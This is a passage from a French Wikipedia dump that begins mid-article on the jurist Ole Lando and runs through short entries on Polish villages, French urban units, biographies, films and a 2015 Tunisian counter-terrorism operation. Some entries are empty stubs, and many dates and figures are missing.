En 1952, il commence à enseigner à la Copenhagen Business School en tant que professeur de droit international privé. En 1954-1955, il devient juge de district à Frederikssund. En 1955, il est devenu membre du gouvernement américain à l'université du Michigan. Il y rencontre Ulrich Drobnig, avec qui il a entretient une étroite amitié depuis. Dans ses études sur le droit international privé Henri Batiffol et Ernst Rabel étaient des modèles. Les avocats américains David F. Cavers et Brainerd Currie et leur école de pensée « Analyse de l'intérêt gouvernemental » l'ont également influencé.
Après avoir obtenu son doctorat en 1963, il se installe définitivement du ministère de la Justice à la Copenhagen Business School et il a enseigné depuis en tant que professeur. En 1973, il a été président de l'Association danoise pour le droit européen et le resta jusqu'en 1995. Il a commenté avec Ole Due le traité instituant la Communauté économique européenne. Il a travaillé dans les années 1970 pour la Conférence des Nations unies sur le commerce et le développement (CNUCED). Ole Lando a travaillé dans et pour la Chambre de commerce internationale.
En 1976, il participe à la création de la Commission sur le droit européen des contrats, parfois appelée « Commission Lando ». Avec le soutien financier de Claus Ehlermann, alors directeur général de la Commission européenne, qu'il avait déjà rencontré à Ann Arbor. En 1979, il devient membre de l'Institut UNIDROIT. 
Selon lui, « Les règles CVIM, UNIDROIT et les Principes européens du droit des contrats constituent le « ius commune » [droit émergent] pour un futur « droit mondial des contrats ». 
Ole Lando était un membre de l'organisation successeure du CECL, le Groupe d'étude sur un code civil européen 1999.

</doc>
<doc id="8979322" url="https://fr.wikipedia.org/wiki?curid=8979322" title="Wacyn">
Wacyn

Wacyn (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979323" url="https://fr.wikipedia.org/wiki?curid=8979323" title="1878 en Bretagne">
1878 en Bretagne

Cette page recense des événements qui se sont produits durant l'année 1878 en Bretagne.

</doc>
<doc id="8979324" url="https://fr.wikipedia.org/wiki?curid=8979324" title="Wola Taczowska">
Wola Taczowska

Wola Taczowska (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979325" url="https://fr.wikipedia.org/wiki?curid=8979325" title="Championnat Américain de Course automobile">
Championnat Américain de Course automobile



</doc>
<doc id="8979326" url="https://fr.wikipedia.org/wiki?curid=8979326" title="Zakrzew-Kolonia (Mazovie)">
Zakrzew-Kolonia (Mazovie)

Zakrzew-Kolonia (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979327" url="https://fr.wikipedia.org/wiki?curid=8979327" title="Zakrzew-Kolonia">
Zakrzew-Kolonia

Zakrzew-Kolonia peut désigner :
Toponymie.
en Pologne

</doc>
<doc id="8979328" url="https://fr.wikipedia.org/wiki?curid=8979328" title="Zakrzew-Las">
Zakrzew-Las

Zakrzew-Las (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979330" url="https://fr.wikipedia.org/wiki?curid=8979330" title="Ilkeston">
Ilkeston

Ilkeston est une ville du Derbyshire, en Angleterre. Chef-lieu du borough d'Erewash, elle est située sur la rivière Erewash, au nord-est de la ville de Derby et à quelques kilomètres à l'ouest de Nottingham, dans le comté voisin du Nottinghamshire.

</doc>
<doc id="8979333" url="https://fr.wikipedia.org/wiki?curid=8979333" title="1879 en Bretagne">
1879 en Bretagne

Cette page recense des événements qui se sont produits durant l'année 1879 en Bretagne.

</doc>
<doc id="8979334" url="https://fr.wikipedia.org/wiki?curid=8979334" title="Zakrzewska Wola (Radom)">
Zakrzewska Wola (Radom)

Zakrzewska Wola (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Zakrzew (siège de la gmina), au nord-ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979336" url="https://fr.wikipedia.org/wiki?curid=8979336" title="Zatopolice">
Zatopolice

Zatopolice (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979338" url="https://fr.wikipedia.org/wiki?curid=8979338" title="La Garonnette">
La Garonnette



</doc>
<doc id="8979341" url="https://fr.wikipedia.org/wiki?curid=8979341" title="Zdziechów (Radom)">
Zdziechów (Radom)

Zdziechów (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979344" url="https://fr.wikipedia.org/wiki?curid=8979344" title="Lutz Niethammer">
Lutz Niethammer

Lutz Niethammer, né à Stuttgart (État populaire libre de Wurtemberg) le et mort à Berlin (Allemagne) le , est un historien allemand, professeur dans plusieurs universités allemandes. Il traite l'histoire allemande d'après-guerre et s’intéresse à l'histoire orale.
Biographie.
Lutz Niethammer naît le 26 décembre 1939 à Stuttgart (capitale actuelle du Land de Bade-Wurtemberg) en Allemagne hitlérienne. 
Il devient un historien, professeur aux universités d'Iéna, de Vienne et de Duisbourg-Essen ainsi qu'à celle d'enseignement à distance de Hagen ("FernUniversität Hagen" . 
Lutz Niethammer traite l’histoire contemporaine, en particulier l'histoire allemande d'après-guerre et l'histoire orale, une méthode de recherche historique qui tente, par l'interrogation de témoins, de reconstituer de façon subjective l'histoire d'une population particulière ou de milieux spécifiques. 
Lutz Niethammer meurt à Berlin le 29 juillet 2025 à l’âge de 85 ans.

</doc>
<doc id="8979345" url="https://fr.wikipedia.org/wiki?curid=8979345" title="Opération de Sidi Aïch">
Opération de Sidi Aïch

L'opération de Sidi Aïch est une opération anti-terroriste menée en Tunisie en mars 2015 contre un groupe de la branche tunisienne d'Al-Qaïda au Maghreb islamique (AQMI), la "katiba Okba Ibn Nafaâ".
Déroulement.
Au soir du , à Sidi Aïch dans le gouvernorat de Gafsa, la garde nationale lance une embuscade contre un véhicule d'AQMI. Lors de l'affrontement qui suit, presque tous les djihadistes qui occupent le véhicule sont tués par les militaires tunisiens, à l'exception d'un combattant qui est blessé et fait prisonnier. Un groupe spécialisé en déminage est ensuite dépêché sur place pour vérifier que les cadavres ne sont pas piégés.
Selon le gouvernement tunisien, neuf djihadistes sont tués durant l'opération, dont l'Algérien Lokman Abou Sakhr, chef de la "katiba" (brigade) "Okba Ibn Nafaâ", d'AQMI. Sur les huit autres djihadistes tués, trois sont algériens et cinq tunisiens.
Le gouvernement tunisien affirme également que Lokmane Abou Sakhr et la "katiba Okba Ibn Nafaâ" étaient responsables de l'attaque du musée du Bardo, même si l'attentat a été revendiqué par l'État islamique et non par AQMI.

</doc>
<doc id="8979347" url="https://fr.wikipedia.org/wiki?curid=8979347" title="Van Sant">
Van Sant



</doc>
<doc id="8979348" url="https://fr.wikipedia.org/wiki?curid=8979348" title="Col Buchanan">
Col Buchanan

Col Buchanan, né le à Lisburn en Irlande du Nord, est un écrivain britannique de fantasy.

</doc>
<doc id="8979349" url="https://fr.wikipedia.org/wiki?curid=8979349" title="Unité urbaine de Figeac">
Unité urbaine de Figeac

L'unité urbaine de Figeac est une unité urbaine française centrée sur Figeac, sous-préfecture du Lot.
Données générales.
Dans le zonage réalisé par l'Insee en 1999, l'unité urbaine était composée de deux communes.
Dans le zonage réalisé en 2010, l'unité urbaine était composée de cinq communes, les communes de Capdenac, Capdenac-Gare et Lunan) ayant été ajoutées au périmètre. Quatre communes sont situées dans le département du Lot (arrondissement de Figeac) et une en Aveyron
Dans le nouveau zonage réalisé en 2020, elle est composée de six communes, toutes situées dans le département du Lot. La commune de Capdenac-Gare, présente dans le zonage de 2010, a été retirée du périmètre et constitue désormais l'unité urbaine de Capdenac-Gare dans l'Aveyron. Par contre, les communes de Camburat et Lissac-et-Mouret ont été ajoutées.
En , avec , elle représente la unité urbaine du département du Lot et occupe le dans la région Occitanie.
En 2021, sa densité de population s'élève à . Par sa superficie, elle ne représente que 1,56 % du territoire départemental mais, par sa population, elle regroupe 7,65 % de la population du département du Lot.
Composition 2020 de l'unité urbaine.
Elle est composée des six communes suivantes :
Évolution démographique.
L'évolution démographique ci-dessous concerne l'unité urbaine selon le périmètre défini en 2020.

</doc>
<doc id="8979351" url="https://fr.wikipedia.org/wiki?curid=8979351" title="Llandovery (Pays de Galles)">
Llandovery (Pays de Galles)



</doc>
<doc id="8979352" url="https://fr.wikipedia.org/wiki?curid=8979352" title="(9172) Abhramu">
(9172) Abhramu

(9172) Abhramu est un astéroïde Amor découvert le par Carolyn S. Shoemaker et Eugene M. Shoemaker à l'observatoire Palomar.
Nom.
Abhramu, la "tricoteuse de nuages", était une éléphante d'origine qui était ailée et surnaturelle, elle pouvait changer de forme à volonté, comme les nuages qui ressemblent à ses enfants. Selon la légende indienne, la tribu d'Abhramu a perdu ses ailes et sa magie par malchance.

</doc>
<doc id="8979353" url="https://fr.wikipedia.org/wiki?curid=8979353" title="Camille Sauvageau">
Camille Sauvageau

Camille François Sauvageau, né le à Angers et mort le au Pouget, près de Sarlat, était un botaniste et un phycologue français.
Biographie.
Il étudia les sciences naturelles à l'université de Montpellier, y terminant ses études en 1884. Il obtient l'agrégation de sciences naturelles en 1886, puis exerça les fonctions d’assistant auprès de Charles Flahault (1884-1888) à Montpellier et de Philippe Van Tieghem (1885-1891) à Paris. En 1891, il obtint son doctorat à Paris avec la thèse "Sur les feuilles de quelques monocotylédones aquatiques". En 1892, il fut nommé professeur à l'université de Lyon avant de devenir professeur de botanique à la Faculté des Sciences de Bordeaux (1901-1932).
Il est connu pour ses enquêtes sur les Phaeophyceae et était une autorité en taxonomie pour de nombreuses espèces d'algues brunes. En 1926, il décrivit l'ordre des Sporochnales. On a donné son nom au genre mycologique "Sauvageautia" (Har., 1892) ainsi qu’aux algues du genre Sauvageaugloia (Hamel ex Kylin, 1940).
L'Académie française des Sciences lui décerna le Prix Montagne pour 1904.
Quelques publications.
Il a réalisé des contributions avec Narcisse Patouillard dans le "Catalogue raisonné des plantes cellulaires de la Tunisie".

</doc>
<doc id="8979354" url="https://fr.wikipedia.org/wiki?curid=8979354" title="Fernando Aínsa">
Fernando Aínsa

Fernando Aínsa Amigues, né le à Palma de Majorque et mort le à Saragosse, est un écrivain hispano-uruguayen.
Carrière.
Né en 1937 à Palma de Majorque, Fernando Aínsa émigre à l’âge de avec sa famille en Uruguay.
De 1974 à 1999, il vit à Paris et travaille à l'Unesco où il est directeur littéraire des Éditions UNESCO. Il s'installe ensuite en 1999 à Saragosse. Essayiste, romancier, poète et critique littéraire reconnu, il élabore une œuvre importante et traduite dans différentes langues (anglais, français, italien, polonais, portugais, arabe, roumain, russe).
Il est membre correspondant de l'Académie nationale des Lettres de l'Uruguay et membre du Patronat royal de la Bibliothèque nationale d'Espagne.
Il reçoit de nombreux prix nationaux et internationaux au Mexique, en Argentine, en Espagne, en France et en Uruguay.
Dans son œuvre critique, Fernando Aínsa s'intéresse à la littérature et à la pensée hispano-américaine, aux concepts d'identité et d'utopie. Il est l'auteur de dix romans ou recueils de nouvelles et cinq recueils de poèmes.

</doc>
<doc id="8979355" url="https://fr.wikipedia.org/wiki?curid=8979355" title="9172 Abhramu">
9172 Abhramu



</doc>
<doc id="8979359" url="https://fr.wikipedia.org/wiki?curid=8979359" title="Accord franco-italien de 1900">
Accord franco-italien de 1900

L’accord franco-italien de 1900 est un accord diplomatique qui met fin à plusieurs différends coloniaux entre France et Italie.
Par cet accord, l’Italie laisse le champ libre à la France au Maroc, tandis que celle-ci laisse à l’Italie le champ libre en Tripolitaine.
Après plusieurs mois de négociations, l'accord est entériné le par un échange de notes entre l'ambassadeur français à Rome Camille Barrère et le ministre italien des affaires étrangères Emilio Visconti-Venosta.
Cet accord approfondit le rapprochement entre la France et l'Italie (contentieux tunisien liquidé en 1896, accord commercial mettant fin à la guerre douanière en 1898).
Il est suivi l'année suivante par l'Accord franco-italien de 1900-1901 concernant la corne de l'Afrique.

</doc>
<doc id="8979361" url="https://fr.wikipedia.org/wiki?curid=8979361" title="Les Ogresses">
Les Ogresses

Les Ogresses (titre original : "Le fate") est une comédie à sketches italo-française, réalisée par Mauro Bolognini, Mario Monicelli, Antonio Pietrangeli et Luciano Salce, sorti en 1966.
"Fata Elena".
Luigi (Jean Sorel) rend visite au mari d'Elena (Raquel Welch) et éprouve une certaine attirance pour celle-ci. Après avoir consommé leur premier rapport, Elena reste sereine et tranquille à broder en présence du mari et d'hôtes, tandis que Luigi se trouvant mal à l'aise décide de regagner son domicile afin de retrouver son épouse qui devrait être occupée à faire de la broderie en présence d'un invité.
"Fata Armenia".
La jeune Armenia (Claudia Cardinale) révolutionne la vie monotone d'un médecin (Gastone Moschin) qu'elle a appelé afin d'ausculter son fils âgé de quelques mois. Armenia vit d’expédients et petits larcins mais se considère honnête et veut uniquement le bien de son enfant dont la couleur de cheveux change étrangement trop souvent.
"Fata Marta".
Madame Marta (Capucine) est l'épouse capricieuse d'un riche et fameux chirurgien (Anthony Steel), patronne sévère et scrupuleuse à jeun mais frivole et sans complexe quand elle est saoule, faisant semblant de tout oublier dès qu'elle revient à son état normal. Giovanni (Alberto Sordi), valet de chambre et chauffeur, nouvellement embauché, en fait les frais.
"Fata Sabina".
Sabina (Monica Vitti) est prise en auto-stop par des automobilistes d'apparence sérieuse et convenable mais échappe à deux tentatives de viol. Finalement, elle rencontre un étranger (Enrico Maria Salerno) qui sait se conduire convenablement, chose impossible pour les Italiens (et Italiennes), insatisfaits et refoulés.

</doc>
<doc id="8979364" url="https://fr.wikipedia.org/wiki?curid=8979364" title="Tournoi de tennis de Carlsbad (WTA 1979 I)">
Tournoi de tennis de Carlsbad (WTA 1979 I)

Le tournoi de tennis de Carlsbad est un tournoi de tennis professionnel. L'édition féminine 1979 I, classée en catégorie Colgate Series, se dispute du au .
Kerry Reid remporte le simple dames. En finale, elle bat Sue Barker.
L'épreuve de double voit quant à elle s'imposer Marcie Louie et Regina Maršíková.

</doc>
<doc id="8979366" url="https://fr.wikipedia.org/wiki?curid=8979366" title="Dimitar Zlatanov">
Dimitar Zlatanov

Dimitar Zlatanov (né le à Ihtiman) est un joueur bulgare de volley-ball. Avec l'équipe de Bulgarie de volley-ball, il remporte la médaille d'argent au Championnat du monde de volley-ball masculin 1970 et aux Jeux olympiques d'été de 1980. En club, il est sacré à huit reprises champion de Bulgarie avec le CSKA Sofia. Il est intronisé au Volleyball Hall of Fame en 2007.
Il est le père de Hristo Zlatanov, joueur international italien de volley-ball.

</doc>
<doc id="8979370" url="https://fr.wikipedia.org/wiki?curid=8979370" title="Ruislip">
Ruislip

Ruislip () est une banlieue du Grand Londres relevant administrativement du borough de Hillingdon. Elle a longtemps été une paroisse rurale du comté de Middlesex, à plusieurs kilomètres au nord-ouest de la capitale. Au début du , l'extension du Metropolitan Railway entraîne une croissance importante de sa population. Ruislip est rattaché au Grand Londres en 1965.

</doc>
<doc id="8979373" url="https://fr.wikipedia.org/wiki?curid=8979373" title="CIPV">
CIPV



</doc>
<doc id="8979376" url="https://fr.wikipedia.org/wiki?curid=8979376" title="Mont Oizuru">
Mont Oizuru

Le se trouve à la limite des préfectures de Gifu, Ishikawa et Toyama au Japon, dans la partie septentrionale du parc national de Hakusan. Cette montagne fait partie des monts Ryōhaku.
Le moine Taichō aurait été le premier à en entreprendre l'ascension au début du .

</doc>
<doc id="8979377" url="https://fr.wikipedia.org/wiki?curid=8979377" title="Championnats de France de ski nordique 2015">
Championnats de France de ski nordique 2015

La des Championnats de France de ski nordique a eu lieu du 27 au 29 mars 2015 à La Féclaz pour les épreuves de ski de fond et biathlon et à Chaux-Neuve pour les épreuves de combiné nordique et saut à ski.

</doc>
<doc id="8979385" url="https://fr.wikipedia.org/wiki?curid=8979385" title="Lokman Abou Sakhr">
Lokman Abou Sakhr

Lokman Abou Sakhr, de son vrai nom Khaled Hamadi Chaieb, est un chef djihadiste et terroriste algérien. Vers 2012, il est désigné comme émir de la katiba "Okba Ibn Nafaâ", la branche tunisienne d'Al-Qaïda au Maghreb islamique (AQMI).
Biographie.
En 2013 et 2014, Lokman Abou Sakhr prend part aux combats sur le Mont Chaambi. Il commande environ 70 à 100 hommes, dont certains seraient issus d'Ansar al-Charia. Il aurait mené, le , l'embuscade de Sabaa Diar au cours de laquelle huit soldats tunisiens sont tués et égorgés. Le à Henchir Talla, ses hommes tuent quinze soldats, infligeant alors son plus sanglant revers à l'armée tunisienne.
En septembre, la katiba ou phalange "Okba Ibn Nafaâ" annonce apporter son soutien à l'État islamique, sans toutefois lui prêter allégeance.
Le , les troupes de la garde nationale tendent une embuscade dans le gouvernorat de Gafsa à un véhicule suspect. Lors de cette opération de Sidi Aïch, neuf terroristes sont tués dont Lokman Abou Sakhr. Le gouvernement tunisien déclare le lendemain que Lokmane Abou Sakhr était responsable de l'attaque du musée du Bardo du 18 mars, malgré le fait que l'attentat ait été revendiqué par l'État islamique et non par AQMI.
Cependant, l'implication réelle de Lokmane Abou Sakhr dans l'attentat du Bardo est mise en doute. Ainsi, pour le journaliste David Thomson, il y a de la part du gouvernement tunisien, , il .
Le , son frère Ouf Abou Mouhajer, est abattu à son tour par les unités sécuritaires et militaires tunisiennes sur les hauteurs de Kasserine.

</doc>
<doc id="8979387" url="https://fr.wikipedia.org/wiki?curid=8979387" title="La Garonette">
La Garonette



</doc>
<doc id="8979389" url="https://fr.wikipedia.org/wiki?curid=8979389" title="Unité urbaine de Lourdes">
Unité urbaine de Lourdes

L'unité urbaine de Lourdes est une unité urbaine française centrée sur la commune de Lourdes, dans le département des Hautes-Pyrénées et la région Occitanie.
Données globales.
En 2010, selon l'Insee, elle est composée de dix communes, toutes situées dans l'arrondissement d'Argelès-Gazost, subdivision administrative du département des Hautes-Pyrénées.
En 2020, à la suite d'un nouveau zonage, elle est composée de treize communes, les communes d'Arcizac-ez-Angles, Saint-Créac et Viger ayant été ajoutées au périmètre.
En , avec , elle représente la unité urbaine du département des Hautes-Pyrénées et occupe le dans la région Occitanie.
En 2022, sa densité de population s'élève à . Par sa superficie, elle ne représente que 1,74 % du territoire départemental mais, par sa population, elle regroupe 7,33 % de la population du département des Hautes-Pyrénées.
Composition de l'unité urbaine en 2020.
Elle est composée des treize communes suivantes :

</doc>
<doc id="8979391" url="https://fr.wikipedia.org/wiki?curid=8979391" title="ROH/NJPW War of the Worlds">
ROH/NJPW War of the Worlds

 est un "" annuel co-produit par la Ring of Honor (ROH) et la New Japan Pro Wrestling (NJPW), disponible uniquement en paiement à la séance et via Ustream. Il s'est déroulé pour la première fois en mai 2014 et met en avant des rivalités entre catcheurs des deux fédérations. À ce jour, six éditions ont eu lieu durant le mois de mai aux États-Unis et au Canada, ainsi qu'au mois d'août au Royaume-Uni. 

</doc>
<doc id="8979393" url="https://fr.wikipedia.org/wiki?curid=8979393" title="Une seconde chance (film, 2014)">
Une seconde chance (film, 2014)

Une seconde chance ("") est un film américain réalisé par Michael Hoffman, sorti en 2014.
Il s'agit de l'adaptation cinématographique du roman du même nom de l'écrivain Nicholas Sparks.
Synopsis.
Amanda et Dawson tombent amoureux durant l'été 1992 et filent le parfait amour jusqu'au jour où par accident, lors d'une bagarre avec son père, Dawson tue son cousin Bobby d'une balle dans le front. Dawson est jugé et incarcéré huit ans. Amanda vient lui rendre visite tous les jours mais il refuse de la voir afin qu'elle puisse concrétiser ses rêves.
Vingt-et-un ans plus tard, Dawson travaille sur une plate-forme pétrolière ; Amanda est mariée et a un enfant nommé Jared. Une explosion survient sur la plate-forme, mais Dawson s'en sort miraculeusement. C'est à ce moment qu'Amanda et Dawson apprennent la mort d'un ancien ami, qui comptait beaucoup pour eux. 
Ils se retrouvent alors et revivent quelques jours heureux, mais tout a une fin. Amanda doit retourner auprès de son mari et de son fils, laissant Dawson derrière elle.

</doc>
<doc id="8979394" url="https://fr.wikipedia.org/wiki?curid=8979394" title="Offensive au Yémen">
Offensive au Yémen



</doc>
<doc id="8979399" url="https://fr.wikipedia.org/wiki?curid=8979399" title="V429 Geminorum">
V429 Geminorum

V429 (en abrégé ) est une étoile située à une distance de du Soleil, dans la constellation zodiacale des Gémeaux. Aussi désignée ', elle est l'objet primaire d'un système planétaire dont l'unique objet secondaire connu est ', une planète confirmée.

</doc>
<doc id="8979401" url="https://fr.wikipedia.org/wiki?curid=8979401" title="BD+20 1790">
BD+20 1790



</doc>
<doc id="8979403" url="https://fr.wikipedia.org/wiki?curid=8979403" title="BD+20 1790 b">
BD+20 1790 b



</doc>
<doc id="8979408" url="https://fr.wikipedia.org/wiki?curid=8979408" title="Igor Ivanov (joueur d'échecs)">
Igor Ivanov (joueur d'échecs)

Igor Vassilievitch Ivanov est un pianiste et un joueur d'échecs soviétique puis canadien, né le à Léningrad et mort le à Saint George (Utah). Après son émigration au Canada en 1980, Ivanov fut champion du Canada à trois reprises (en 1981. 1986 et 1987). Il reçut le titre de grand maître international peu avant sa mort d'un cancer en 2005.
Biographie et carrière.
Igor Ivanov apprit à jouer aux échecs à quatre ans et étudia le piano pendant son enfance. Il fit des études de mathématiques à Léningrad qu'il interrompit pour se consacrer aux échecs. En 1978, il remporta le mémorial Igor Zaïtsev à Vladivostok et finit premier du tournoi de sélection de Daugavpils, "ex æquo" avec Garry Kasparov. En 1979, il gagna le mémorial Taïliev à Achgabat et le tournoi de Iaroslavl. Ivanov se fit remarquer internationalement lorsqu'il battit le champion du monde Anatoli Karpov lors des spartakiades d'URSS organisées en 1979. L'année suivante, il fit partie de la délégation soviétique qui participait au mémorial Capablanca à Cienfuegos. Lors du retour vers Moscou, l'avion tchécoslovaque fit une escale à Gander (Terre-Neuve-et-Labrador). Igor Ivanov s'échappa de la délégation et demanda l'asile politique au Canada.
En 1981, Ivanov gagna le championnat du Canada, puis fit partie de l'équipe de secondants de Viktor Kortchnoï lors du Championnat du monde d'échecs 1981 à Mérano. Grâce à sa victoire au championnat canadien qui était aussi un tournoi zonal, Ivanov obtint le titre de maître international et se qualifiait pour le tournoi interzonal de Toluca. À Toluca, il finit quatrième (seuls les deux premiers étaient qualifiés pour le tournoi des candidats).
Ivanov représenta le Canada lors de deux olympiades : en 1984 et 1988, il jouait au premier échiquier.
En 1990, Ivanov s'installa aux États-Unis, en Utah, avec sa femme et travailla comme entraîneur de joueurs d'échecs. Il participa régulièrement aux championnats d'Utah. Dans les classements publiés par la fédération internationale, il était affilié à la fédération américaine tout en restant citoyen canadien.

</doc>
<doc id="8979409" url="https://fr.wikipedia.org/wiki?curid=8979409" title="Mont Bessan">
Mont Bessan

Le , culminant à d'altitude, est situé à la limite de Gujō dans la préfecture de Gifu et Hakusan dans la préfecture d'Ishikawa au Japon. Il y a deux stations de triangulation au sommet de la montagne. Le mont Haku est visible depuis le nord. Le Bessan-jinja se trouve à peu de distance du sommet. Cette zone fait partie du parc national de Hakusan.

</doc>
<doc id="8979411" url="https://fr.wikipedia.org/wiki?curid=8979411" title="Flávio de Barros">
Flávio de Barros

Flávio de Barros (lieu et date de naissance et de décès inconnus, mais vraisemblablement dans l'État de Bahia) était un photographe brésilien. 
En 1897, il réalisa, sur commande de l’armée brésilienne, et sous le contrôle étroit de celle-ci, des photographies de la dernière phase de la guerre de Canudos, dont quelques-unes sont connues de tout Brésilien scolarisé et ont acquis dans la mémoire collective brésilienne valeur d’icône historique. L’écrivain Euclides da Cunha en utilisa trois pour la première édition de son "Os Sertões" de 1903, et la plupart figurent en bonne place dans l’iconographie de la première phase de la république brésilienne.
Biographie.
L’on ne sait quasiment rien sur la vie de Flávio de Barros. Au moment où il fut engagé par l’armée républicaine en , en pleine guerre de Canudos, il était un photographe peu connu, établi dans la capitale bahianaise Salvador. Ce n’est qu’à partir du début du que l’on trouve des traces de ses services professionnels, sous forme de références et d’annonces dans les journaux et almanachs publiés dans la Bahia. Il n’y a pas d’éléments permettant de conclure à l’existence ou non chez Flávio de Barros d’ambitions artistiques ou historiographiques. Sa mission accomplie, il plongea de nouveau dans l’anonymat, à telle enseigne que l’année de sa mort n’a même pas pu être déterminée.
De cet obscur photographe bahianais l’on sait donc seulement qu’il se vit confier par l’armée, alors sous le commandement du général Artur Oscar de Andrade Guimarães, la périlleuse et éprouvante mission de composer un ensemble de documents photographiques sur la dernière campagne de Canudos, mission sans doute jugée peu attrayante par les photographes bahianais plus renommés. Nous ignorons s’il fut appointé par le gouvernement, mais il y a lieu de croire qu’il ne le fut pas directement. Sous quelque forme que ces photographies aient été commercialisées, il est probable que l’armée et les officiers en étaient les plus grands acquéreurs. L’on ne sait pas davantage si ce travail s’avéra pour lui une bonne affaire, mais le fait que seuls deux collections complètes soient parvenues jusqu’à nous portent à penser que les albums ne s’écoulaient pas en nombres considérables. D’autre part, vu qu’à cette époque-là, il n’était pas encore possible techniquement de publier des photos dans les journaux, les clichés ne pouvaient pas non plus trouver preneur chez les organes de presse.
Canudos.
S’autodésignant "photographe expéditionnaire", Flávio de Barros s’incorpora dans les troupes républicaines le , c’est-à-dire au moment où le ministre de la Guerre, le maréchal Carlos Machado Bittencourt, et le général Carlos Eugênio de Andrade Guimarães, qui accompagnaient les bataillons de renfort en vue de l’offensive finale contre Canudos, s’apprêtaient à se rendre dans le "sertão" Bahianais pour y superviser les opérations. L’itinéraire de Flávio de Barros incluait, après un trajet en chemin de fer au départ de Salvador, les localités de Queimadas, où se trouvait la gare d’arrivée et où il séjourna entre le et le , de Cansanção, le , et de Monte Santo, base arrière des opérations militaires, où il demeura entre le 6 et le , pour finalement atteindre Canudos le 26, où il restera jusqu’à la fin des combats début octobre. Ce sont donc les dernières journées de la guerre qu’enregistrera l’œil de ses appareils photo.
La guerre de Canudos fut le premier grand conflit intérieur brésilien à faire l’objet d’une représentation photographique. Pourtant, Barros ne fut pas le seul à s’y être attelé : l’avait précédé en effet le photographe espagnol Juan Gutiérrez, qui avait été auparavant déjà l’auteur des images de la révolte de la Marine de 1893, et qui avait lui aussi accompagné la quatrième expédition, mais avait trouvé la mort au milieu des combats, probablement le . D’autre part, l’ingénieur militaire et journaliste Euclides da Cunha, correspondant du quotidien paulista "O Estado de S. Paulo" et futur auteur du chef-d’œuvre "Os Sertões" de 1902 (trad. française sous le titre "Hautes Terres"), avait lui aussi eu recours à un appareil photographique pour enregistrer l’arrière-pays ("sertão") bahianais pendant la guerre de Canudos. Toutefois, ni les clichés réalisés par Gutiérrez, ni ceux d’Euclides da Cunha, n’ont pu être retrouvés à ce jour. 
Dès les premières éditions d’"Os sertões", ce classique de l’historiographie et maître-livre de la littérature brésilienne, Da Cunha fit appel à ce moyen de représentation assez novateur dans la production éditoriale de l’époque, qu’est la photographie. Au demeurant, les seules photographies utilisées dans ce but par Da Cunha, au nombre de trois, sont issues de la série produite par Flávio de Barros. Si Da Cunha, tôt fasciné par cette nouvelle technique mimétique alors réputée capable de reproduire fidèlement la réalité, emporta avec lui un appareil photo, ses tentatives restèrent sans résultats pratiques, et c’est en fait Flávio de Barros qui mena à bien le dessein de l’écrivain. Il semble même que celui-ci ait écrit quelques scènes de son récit en se remémorant et interprétant certaines des photos de Flávio de Barros, quoique Da Cunha n’ait pas daigné mentionner une seule fois le nom du photographe.
Il y a lieu d’observer que quand Barros arriva à Canudos, le village rebelle avait déjà subi de sérieux revers et que son chef, le prédicateur laïc Antônio Conselheiro, avait déjà péri, encore que les forces armées ignorassent ce fait ; Canudos se trouvait désormais encerclée, l’armée occupant en effet toutes les voies d’accès et tous les points stratégiques, et les "conselheiristas" étaient à court d’eau et de denrées alimentaires. En somme, il ne restait plus guère pour Barros qu’à enregistrer la victoire.
Mission.
Si les photos devaient en premier lieu servir de souvenir pour les officiers et soldats — « un photographe qui se propose de produire les portraits des officiers de tous les bataillons, ainsi que diverses prises de vue le long du parcours vers Canudos », ainsi que le signalait le journal "A Notícia" de Rio de Janeiro dans son édition du —, le travail de Barros devait également permettre le façonnement, à l’intention du public, d’une représentation déterminée de la guerre, représentation qui, authentifiée par le supposé "réalisme photographique", viendrait s’intégrer dans l’ensemble d’éléments discursifs exploités par l’armée au sujet des événements. Ces représentations visaient à établir un lien entre d’une part l’image de la corporation militaire brésilienne et d’autre part les idées de maintien de l’ordre et de cohésion intérieurs et de consolidation du régime républicain, face à la menace d’une réaction monarchiste, autrement dit : la mission de Barros était indissolublement associée à la fabrication par l’armée d’un imaginaire déterminé relativement au conflit en cours.
Ce fut la première fois que l’armée brésilienne s’attachait elle-même à rendre compte photographiquement d’une guerre où elle se trouvait impliquée. Les images obtenues jouèrent un rôle significatif dans le système de propagande des autorités militaires et des élites, au service d’une politique d’information (et de désinformation) dirigée vers l’opinion publique, au Brésil et dans le monde, s’ajoutant aux multiples communiqués destinés à la presse nationale et internationale.
